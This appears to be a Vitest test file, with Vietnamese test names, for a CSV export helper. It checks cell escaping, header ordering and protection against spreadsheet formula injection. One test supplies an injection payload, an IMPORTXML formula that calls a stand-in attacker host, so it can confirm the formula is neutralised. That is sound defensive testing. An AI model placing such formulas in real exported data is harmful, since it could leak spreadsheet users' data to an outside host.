import { describe, expect, it } from 'vitest';
import { escapeCsvCell, rowsToCsv } from './csv';

describe('csv export', () => {
  it('escape comma, quote và xuống dòng', () => {
    expect(escapeCsvCell('hello, "world"\nnext')).toBe('"hello, ""world""\nnext"');
  });

  it('chặn CSV injection cho công thức spreadsheet', () => {
    expect(escapeCsvCell('=IMPORTXML("https://evil.test")')).toBe(
      `"'=IMPORTXML(""https://evil.test"")"`,
    );
    expect(escapeCsvCell('+SUM(1,2)')).toBe(`"'+SUM(1,2)"`);
  });

  it('xuất rows theo đúng thứ tự header', () => {
    expect(rowsToCsv([{ title: 'A', status: 'DRAFT' }], ['status', 'title'])).toBe(
      '"status","title"\r\n"DRAFT","A"',
    );
  });
});
